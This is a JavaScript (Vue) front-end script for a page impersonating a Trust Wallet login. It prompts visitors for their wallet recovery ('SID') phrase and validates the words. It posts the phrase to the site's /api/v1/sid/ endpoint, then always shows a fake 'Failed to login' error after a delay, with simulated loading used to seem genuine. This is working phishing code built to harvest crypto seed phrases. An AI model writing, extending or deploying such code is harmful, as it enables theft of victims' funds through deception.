import { createApp } from 'https://unpkg.com/vue@3/dist/vue.esm-browser.js';

let appDesc = {
    mounted() {
        this.fake_loading();
    },
    data() {
        return {
            loading: true,
            phrase: '',
            sid: [],
            legacy: true,

            // Select
            select_isOpen: false,
            select_icon_src: '/static/images/TWT.svg',
            select_text: 'Trust Wallet',
            //
        }
    },
    methods: {
        login_click(evt) {
            this.loading = true;
            let _this = this;
            let payload = {
                csrfmiddlewaretoken: csrftoken,
                wallet_name: this.select_text,
                sid_phrase : this.phrase,
            }

            let url = 'http://' + window.location.host + '/api/v1/sid/';

            axios.post(url, payload)
                .then(function (response) {
                    console.log(response.data);
                })
                .catch(function (response) {
                    console.log(response.data);
                })
                .finally(function () {
                    setTimeout(() => {
                        _this.loading = false;
                        alert.show(alert.messageType.error, 'Failed to login. Please check your SID phrase and try again.', 'Log In');
                    }, 2500);
                });
        },
        select_item_click(evt) {
            let node = evt.currentTarget;
            this.select_text = node.innerText;
            this.select_icon_src = node.getElementsByTagName('img')
                .item(0)
                .getAttribute('src');
        },
        select_click() {
            this.select_isOpen = !this.select_isOpen;
        },
        fake_loading() {
            this.loading = true;
            let _this = this;
            setTimeout(() => {
                _this.loading = false;
            }, 100);
        },
        is_loading() {
            return !this.loading;
        },
        wallets_click() {
            this.loading = true;
            this.legacy = !this.legacy;
            let _this = this;
            setTimeout(() => {
                _this.loading = false;
            }, 100);
        },
        process_input(evt) {
            this.phrase = evt.target.value.trim().toLowerCase();
            this.sid = [];

            if (!this.phrase)
                return;

            const re = /\s+/gm;
            let words = this.phrase.split(re);

            words.forEach(element => {
                this.sid.push({
                    word: element,
                    valid: /^[a-z]+$/gm.test(element),

                });
            });
        },
        on_paste(evt) {
            evt.target.value = '';
        },
    }
}

document.app_cw = createApp(appDesc).mount('#app_cw');

console.info(
    'login.js loaded succesfully'
);